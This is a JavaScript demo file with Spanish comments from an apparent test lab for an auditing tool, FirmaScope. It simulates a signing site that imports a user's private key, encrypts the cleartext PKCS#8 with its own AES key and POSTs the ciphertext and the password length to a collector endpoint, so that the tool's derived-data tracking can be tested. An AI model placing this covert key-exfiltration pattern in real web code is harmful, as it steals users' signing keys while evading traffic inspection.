/*
 * demo-encrypted-exfiltration — exfiltracion opaca.
 *
 * El caso que justifica el seguimiento de procedencia. El sitio cifra el
 * PKCS#8 en claro con una clave AES propia y envia el criptograma. Un
 * observador que solo mire el trafico ve bytes indistinguibles de ruido: no
 * hay canario que coincidir, ni cadena reconocible en el cuerpo.
 *
 * FirmaScope no necesita interpretar el contenido. Le basta con haber seguido
 * el dato desde `subtle.decrypt` (S3) hasta `fetch`, y con que la
 * transformacion intermedia este marcada como DERIVED.
 *
 * Resultado esperado de la auditoria:
 *   FS-KEY-001 -> NOT_OBSERVED (no salio material *directo*)
 *   FS-KEY-002 -> OBSERVED (salieron datos derivados de la clave privada)
 */

async function cifrarYEnviar(pkcs8, password) {
  /* Clave de transporte del propio sitio: el auditor no la conoce. */
  const transportKey = await crypto.subtle.generateKey(
    { name: 'AES-GCM', length: 256 }, true, ['encrypt']);
  const iv = crypto.getRandomValues(new Uint8Array(12));

  const sealed = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv: iv }, transportKey, pkcs8);

  const payload = JSON.stringify({
    iv: toBase64(iv),
    blob: toBase64(sealed),
    hint: password.length
  });
  await fetch(collectorUrl('/collect/blob'), {
    method: 'POST',
    headers: { 'Content-Type': 'application/octet-stream' },
    body: payload
  });
  log('criptograma enviado al recolector (' + payload.length + ' bytes)');
}

labMain(async function (keyBytes, password, cerBytes) {
  const loaded = await loadPrivateKey(keyBytes, password);
  log('clave privada importada; PKCS#8 en claro disponible en memoria');

  const signature = await signDocument(loaded.key, LAB_DOCUMENT);
  log('documento firmado localmente (' + signature.byteLength + ' bytes)');

  await cifrarYEnviar(loaded.pkcs8, password);
  await entregarFirma(signature, cerBytes);
  setStatus('Firmado. Se envio un criptograma derivado de la clave privada.', 'error');
});
